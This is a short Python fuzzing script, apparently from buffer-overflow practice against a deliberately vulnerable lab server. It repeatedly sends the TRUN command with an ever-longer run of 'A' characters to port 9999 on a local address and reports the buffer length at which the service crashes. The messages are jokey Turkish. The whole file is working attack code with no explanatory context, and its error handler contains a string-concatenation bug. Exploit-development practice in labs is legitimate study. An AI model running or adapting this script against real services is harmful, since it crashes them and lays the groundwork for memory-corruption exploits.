import socket
import time
import sys
numberOfCharacters = 100
stringToSend = "TRUN /.:/" + "A" * numberOfCharacters

while True:
    try:
        mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mySocket.connect(("10.0.2.15",9999))
        bytes=stringToSend.encode(encoding="latin1")
        mySocket.send(bytes)
        mySocket.close()
        stringToSend = stringToSend + "A" * numberOfCharacters
        time.sleep(1)
    except KeyboardInterrupt:
        print("Crash Point: "+ str(len(stringToSend)))
        print("Ctrl+c çektin babay")
        sys.exit()
    except Exception as e:
        print("Crash Point: "+ str(len(stringToSend)))
        print("Sunucu aşko babay<3\n"+e)
        sys.exit()

